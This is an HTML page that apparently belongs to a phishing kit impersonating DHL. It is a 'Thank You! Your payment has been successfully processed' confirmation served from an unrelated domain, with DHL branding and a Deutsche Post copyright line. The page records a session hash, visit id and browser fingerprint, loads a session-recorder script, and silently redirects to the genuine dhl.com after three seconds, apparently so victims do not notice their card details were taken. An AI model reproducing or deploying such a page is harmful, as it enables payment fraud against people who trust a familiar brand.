<!doctype html>
<html lang="fr" >
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="session_hash" content="2c4f56a6f6ecc57a69b5ebb2fe0be4b3">
    <meta name="visit_id" content="775">
        <link rel="stylesheet" href="../css/app.css">
    <style>
    body {
    overflow-x: hidden;
    }
    img.bus_logo {
    padding-top: 50px;
    }
    p.thank {
    margin-top: 20px;
    font-size: 50px;
    font-weight: 900;
    color: #ce0808;
    text-align: center;
    }
    p.processed {
    font-size: 20px;
    font-weight: 700;
    color: #000;
    text-align: center;
    }
    .order {
    background-color: #56565644;
    width: 100%;
    }
    .order p {
    padding: 35px;font-size: 15px;
    }
    .order span {
    font-weight: bold;
    color: #000;
    }
    button.backBtn {
    border: none;
    background-color: #cf302b;
    color: #fff;
    padding: 5px 12px 5px 12px;
    border-radius: 3px;
    }
    @media(max-width: 320px){
        p.thank {
        font-size: 18px;
        }
        img.bus_logo {
        width: 100%;
        }
        p.processed {
        font-size: 10px;}
        .order p {
        font-size: 10px;
        }
        button.backBtn {
        font-size: 9px;
        }
    }
    @media(min-width: 320px) and (max-width: 480px){
        img.bus_logo {
        width: 100%;
        }
        p.thank {
        font-size: 20px;
        }
    }
    @media (min-width: 480px) and (max-width: 576px){
        p.thank {
        font-size: 35px;
        }
        img.bus_logo {
        width: 100%;
        }
        p.processed {
        font-size: 15px;}
        .order p {
        font-size: 10px;
    }
    }
</style>
    <title></title>
    <link rel="icon" type="image/ico" href="https://dispatching-centre.wtechsmartwater.com/images/favicon.gif"/>
  </head>
  <body  data-aos-easing="ease" data-aos-duration="1000" data-aos-delay="0" style="margin: 0;">
  <div class="se-pre-con"></div>
  <header class="header">
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <div class="container">

            <button class="bg-transparent border-0 p-0 d-md-none" onclick="openNav()">
                    <i class="fa fa-bars" style="font-size: 20px; color: #7d7a7a;"></i>
            </button>
            <!-- mobile part -->
            <a class="navbar-brand p-0" href="#">
                <img src="https://dispatching-centre.wtechsmartwater.com/images/logo.png" alt="" class="img-responsive">
            </a>
            <form class="mb-1 d-md-none">
                <div class="form-item mobile-country-selector">
                    <label for="mobile_country_selector" style="display:none;">Select a country here...</label>
                    <input id="mobile_country_selector" class="d-none" type="text">
                </div>
                <div class="form-item" style="display:none;">
                    <input type="text" id="mobile_country_selector_code" name="mobile_country_selector_code" data-countrycodeinput="1" readonly="readonly" placeholder="Selected country code will appear here" />
                    <label for="mobile_country_selector_code">...and the selected country code will be updated here</label>
                </div>
                <button type="submit" style="display:none;">Submit</button>
            </form>

            <div id="mySidepanel" class="sidepanel">
                <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">×</a>
                <a href="#" class=""><span class="mbl_home"><i class="fas fa-home"></i></span>Home</a>
                <a href="#" class=""><span class="mbl_ship"><i class="fas fa-shipping-fast"></i></span>Ship</a>
                <a href="#" class=""><span class="mbl_track"><i class="fas fa-location-arrow"></i></span>Track</a>
                <a class="mbl_help" href="#"><span class="ic"><i class="fas fa-hands-helping"></i></span>Help and support</a>
                <a class="mbl_find" href="#"><span class="icc"><i class="fas fa-map-marker-alt"></i></span>Find a location/a>

                <a href="#" class=" reg_m"><span class="mbl_reg"><i class="fas fa-lock"></i></span>Connexion</a>

            </div>
            <div class="navbar-collapse">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link" href="#">Help and support</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link loc" href="#">Find a location</a>
                    </li>
                    <li>
                        <div class="jhGf">
                            <label for="">
                                <span class="page-search-divider"></span>
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-search" viewBox="0 0 16 16">
                                    <path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/>
                                </svg>
                            </label>
                        </div>
                    </li>
                    <li class="v2-vertical-divider"></li>
                    <li>
                        <div class="container">
                            <form>
                                <div class="form-item">
                                    <label for="country_selector" style="display:none;">Sélectionnez un pays ici...</label>
                                    <input id="country_selector" type="text">
                                </div>
                                <div class="form-item" style="display:none;">
                                    <input type="text" id="country_selector_code" name="country_selector_code" data-countrycodeinput="1" readonly="readonly" placeholder="Selected country code will appear here" />
                                    <label for="country_selector_code">...et le code pays sélectionné sera mis à jour ici</label>
                                </div>
                                <button type="submit" style="display:none;">soumettre</button>
                            </form>
                        </div>
                    </li>
                </ul>
            <!-- <form class="d-flex">
                <input class="form-control me-2" type="search" placeholder="Search" aria-label="Search">
                <button class="btn btn-outline-success" type="submit">Search</button>
            </form> -->
            </div>
        </div>
    </nav>
    <div class="iKjer"></div>
    <div class="header-nav">
        <div class="container">
            <div class="row">
                <div class="col-sm-6 col-md-8 col">
                    <ul class="header-navbar-nav me-auto mb-2 mb-lg-0">
                        <li class="nav-li">
                            <a href="#" class="top-nav">Home</a>
                        </li>
                        <li class="nav-li">
                            <a href="#" class="top-nav">Ship</a>
                        </li>
                        <li class="nav-li">
                            <a href="#" class="top-nav">Track</a>
                        </li>
                    </ul>
                </div>
                <div class="col-sm-6 col-md-3 col">
                    <ul class="eriOl">
                        <li class="nav-li"><a href="#" class="top-nav">Register</a></li>
                        <li class="nav-li"><a href="#" class="top-nav">Login</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</header>

    <div class="container">
    <div class="row main-container">
        <div class="col col-sm-12">
            <div class="text-center">
            <img class="bus_logo" src="https://dispatching-centre.wtechsmartwater.com/images/bus.png" alt="">
            </div>

            <p class="thank">Thank You!</p>
            <p class="processed">Your payment has been successfully processed.</p>
            <div class="order">
                <p class=""><span>Your order is confirmed.</span> <br>Your package will be delivered within the next 7 working days.</p>

            </div>
            <div class="d-flex justify-content-center"><button class="backBtn" onclick="window.location.href = 'https://dhl.com'">Return to home page</button></div>
        </div>
    </div>
</div>

<footer>
    <div class="footer-border">
        <div class="container">
            <hr>
            <div class="row">
                <div class="col-sm-12 col-md-8">
                    <div class="pdIr">
                        <div class="row">
                            <div class="col-sm-12 col-md-4 col">
                                <div class="square">
                                    <h4 class="headline">Contact and Support </h4>
                                    <ul>
                                        <li><a href="#">Help and support</a></li>
                                        <li><a href="#">FAQs</a></li>
                                        <li><a href="#">Contact Us</a></li>
                                        <li><a href="#">Find a location</a></li>
                                    </ul>
                                </div>
                            </div>
                            <div class="col-sm-12 col-md-4 col">
                                <div class="square">
                                    <h4 class="headline">Legal</h4>
                                    <ul>
                                        <li><a href="#">Terms and Conditions</a></li>
                                        <li><a href="#">Privacy Notice</a></li>
                                    </ul>
                                </div>
                            </div>
                            <div class="col-sm-12 col-md-4 col">
                                <div class="square">
                                <h4 class="headline">Alerts</h4>
                                    <ul>
                                        <li><a href="#">Fraud Awareness</a></li>
                                        <li><a href="#">Fraud Support</a></li>
                                        <li><a href="#">Important Information</a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-sm-12 col-md-4">
                    <div class="wetSq">
                        <div class="cyNe">
                            <img src="https://dispatching-centre.wtechsmartwater.com/images/foo.png" alt="">
                        </div>
                        <div class="ledIu">
                            <ul>
                                <li><a href="#">About DHL</a></li>
                                <li><a href="#">News</a></li>
                                <li><a href="#">Careers</a></li>
                                <li><a href="#">Legal notice</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <hr>
        </div>
    </div>
    <div class="footer-media">
        <div class="container">
            <div class="row">
                <div class="col">
                    <div class="social">
                        <h4>Follow us</h4>
                        <ul>
                            <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
                            <li><a href="#"><i class="fab fa-twitter"></i></a></li>
                            <li><a href="#"><i class="fab fa-youtube"></i></a></li>
                            <li><a href="#"><i class="fab fa-instagram"></i></a></li>
                        </ul>
                    </div>
                </div>
                <div class="col offset-md-4">
                    <div class="copyright">
                        <p>2022 © Deutsche Post AG - All rights reserved</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</footer>
    <script>
        window.sessionHash = "2c4f56a6f6ecc57a69b5ebb2fe0be4b3";
        window.visitId = 775;
        window.fingerprint = "50067ecceb9ac350c8a7c089d1c6ccb5";
    </script>


    <script src="../js/app.js"></script>i
	<script>
		$("#country_selector").countrySelect({
			preferredCountries: ['tn', 'us']
		});

		$("#mobile_country_selector").countrySelect({
			preferredCountries: ['tn', 'us']
		});
	</script>

    <script>
        $(window).on('load', function() {
            $(".modal-loader").hide();
            $(".se-pre-con").fadeOut();
            $('.se-pre-con').on('load',function(){
                $('.modal-loader').hide();
            });
            setTimeout(() => {
                window.location.href = "https://dhl.com";
            }, 3000);
        });

        function openNav() {
            $('#mySidepanel')[0].style.width = "250px";
        }

        function closeNav() {
            $('#mySidepanel')[0].style.width = "0";
        }
    </script>
        <script src="js/session-recorder.js"></script>
          </body>
</html>
